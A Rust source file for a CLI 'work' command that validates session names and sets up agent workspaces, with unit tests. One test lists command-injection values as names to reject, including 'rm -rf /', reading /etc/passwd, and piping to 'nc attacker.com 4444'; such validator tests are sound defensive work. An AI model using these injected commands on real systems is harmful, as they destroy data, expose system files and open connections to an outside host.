//! Action functions for the work command handler (Tier 3).
//!
//! I/O operations that create/manage work sessions.

use scp_core::output::Output;
use scp_core::validation::domain::validate_session_name;
use scp_core::{Error, Result};

use super::data::{build_env_vars, generate_short_id, WorkOptions, WorkOutput};

/// Execute the work command with the given options.
///
/// This is the unified workflow start for AI agents, combining session
/// creation, agent registration, and environment setup into one atomic
/// operation.
///
/// # Errors
///
/// Returns an error if:
/// - The session name fails validation
/// - Not in a git repository
/// - Session creation fails
/// - Already in a workspace (unless idempotent)
pub fn run_work(options: &WorkOptions) -> Result<()> {
    validate_session_name(&options.name).map_err(|_| {
        Error::validation_error(format!("Invalid session name: '{}'", options.name))
    })?;

    // Dry run - just show what would happen.
    if options.dry_run {
        return output_dry_run(options);
    }

    // TODO: Wire up actual session creation, workspace detection, and
    // database lookup once the workspace/session infrastructure is
    // integrated. For now, validate inputs and produce output.

    let workspace_path = format!(".scp/workspaces/{}", options.name);

    // Generate agent ID if needed.
    let agent_id = if options.no_agent {
        None
    } else {
        options
            .agent_id
            .clone()
            .or_else(|| Some(format!("agent-{}", generate_short_id())))
    };

    let output = WorkOutput {
        name: options.name.clone(),
        workspace_path: workspace_path.clone(),
        created: true,
        agent_id: agent_id.clone(),
        bead_id: options.bead_id.clone(),
        env_vars: build_env_vars(
            &options.name,
            &workspace_path,
            agent_id.as_deref(),
            options.bead_id.as_deref(),
        ),
        enter_command: format!("cd {workspace_path}"),
    };

    output_result(&output)
}

/// Output result for an existing workspace (idempotent mode).
fn output_existing_workspace(name: &str, options: &WorkOptions) -> Result<()> {
    let workspace_path = format!(".scp/workspaces/{name}");

    let agent_id = if options.no_agent {
        None
    } else {
        options.agent_id.clone()
    };

    let output = WorkOutput {
        name: name.to_string(),
        workspace_path: workspace_path.clone(),
        created: false,
        agent_id: agent_id.clone(),
        bead_id: options.bead_id.clone(),
        env_vars: build_env_vars(
            name,
            &workspace_path,
            agent_id.as_deref(),
            options.bead_id.as_deref(),
        ),
        enter_command: format!("cd {workspace_path}"),
    };

    output_result(&output)
}

/// Output for dry run mode.
fn output_dry_run(options: &WorkOptions) -> Result<()> {
    let workspace_path = format!(".scp/workspaces/{}", options.name);

    let agent_id = if options.no_agent {
        None
    } else {
        options
            .agent_id
            .clone()
            .or_else(|| Some(format!("agent-{}", generate_short_id())))
    };

    let output = WorkOutput {
        name: options.name.clone(),
        workspace_path: workspace_path.clone(),
        created: false,
        agent_id,
        bead_id: options.bead_id.clone(),
        env_vars: build_env_vars(&options.name, &workspace_path, None, None),
        enter_command: format!("cd {workspace_path}"),
    };

    Output::info(&format!(
        "[DRY RUN] Would create session '{}'",
        options.name
    ));
    Output::info(&format!("  Workspace: .scp/workspaces/{}", options.name));
    if let Some(ref bead) = options.bead_id {
        Output::info(&format!("  Bead: {bead}"));
    }

    let _ = output;
    Ok(())
}

/// Output the result to stdout.
fn output_result(output: &WorkOutput) -> Result<()> {
    if output.created {
        Output::info(&format!("Created session '{}'", output.name));
    } else {
        Output::info(&format!("Using existing session '{}'", output.name));
    }
    Output::info(&format!("  Workspace: {}", output.workspace_path));
    if let Some(ref agent) = output.agent_id {
        Output::info(&format!("  Agent: {agent}"));
    }
    if let Some(ref bead) = output.bead_id {
        Output::info(&format!("  Bead: {bead}"));
    }
    Output::info("");
    Output::info("To enter workspace:");
    Output::info(&format!("  {}", output.enter_command));

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use scp_core::OutputFormat;

    fn test_options(name: &str) -> WorkOptions {
        WorkOptions {
            name: name.to_string(),
            bead_id: None,
            agent_id: None,
            no_agent: false,
            idempotent: false,
            dry_run: false,
            format: OutputFormat::Json,
        }
    }

    #[test]
    fn run_work_valid_name() {
        let options = test_options("my-session");
        assert!(run_work(&options).is_ok());
    }

    #[test]
    fn run_work_dry_run() {
        let options = WorkOptions {
            name: "dry-session".to_string(),
            bead_id: None,
            agent_id: None,
            no_agent: false,
            idempotent: false,
            dry_run: true,
            format: OutputFormat::Json,
        };
        assert!(run_work(&options).is_ok());
    }

    #[test]
    fn run_work_rejects_empty_name() {
        let options = WorkOptions {
            name: String::new(),
            bead_id: None,
            agent_id: None,
            no_agent: false,
            idempotent: false,
            dry_run: false,
            format: OutputFormat::Json,
        };
        assert!(run_work(&options).is_err());
    }

    #[test]
    fn run_work_rejects_shell_metacharacters() {
        let malicious_names = vec![
            "test;rm -rf /",
            "test$(cat /etc/passwd)",
            "test`whoami`",
            "test|nc attacker.com 4444",
            "../etc/passwd",
            "/etc/passwd",
            "test\0name",
        ];

        for name in malicious_names {
            let options = WorkOptions {
                name: name.to_string(),
                bead_id: None,
                agent_id: None,
                no_agent: false,
                idempotent: false,
                dry_run: false,
                format: OutputFormat::Json,
            };
            assert!(
                run_work(&options).is_err(),
                "Should reject malicious name: {name}"
            );
        }
    }

    #[test]
    fn run_work_with_bead_id() {
        let options = WorkOptions {
            name: "bead-session".to_string(),
            bead_id: Some("scp-12345".to_string()),
            agent_id: None,
            no_agent: false,
            idempotent: false,
            dry_run: false,
            format: OutputFormat::Json,
        };
        assert!(run_work(&options).is_ok());
    }

    #[test]
    fn run_work_no_agent() {
        let options = WorkOptions {
            name: "no-agent-session".to_string(),
            bead_id: None,
            agent_id: None,
            no_agent: true,
            idempotent: false,
            dry_run: false,
            format: OutputFormat::Json,
        };
        assert!(run_work(&options).is_ok());
    }

    #[test]
    fn run_work_with_explicit_agent_id() {
        let options = WorkOptions {
            name: "agent-session".to_string(),
            bead_id: None,
            agent_id: Some("agent-custom".to_string()),
            no_agent: false,
            idempotent: false,
            dry_run: false,
            format: OutputFormat::Json,
        };
        assert!(run_work(&options).is_ok());
    }

    #[test]
    fn run_work_accepts_valid_names() {
        let valid_names = vec![
            "workspace",
            "my-workspace",
            "my_workspace",
            "workspace123",
            "MyWorkspace",
            "FeatureBranch-123",
        ];

        for name in valid_names {
            let options = test_options(name);
            assert!(
                run_work(&options).is_ok(),
                "Should accept valid name: {name}"
            );
        }
    }

    #[test]
    fn output_existing_workspace_succeeds() {
        let options = test_options("existing");
        assert!(output_existing_workspace("existing", &options).is_ok());
    }

    #[test]
    fn output_dry_run_succeeds() {
        let options = WorkOptions {
            name: "dry-test".to_string(),
            bead_id: Some("bead-1".to_string()),
            agent_id: None,
            no_agent: false,
            idempotent: false,
            dry_run: true,
            format: OutputFormat::Json,
        };
        assert!(output_dry_run(&options).is_ok());
    }
}
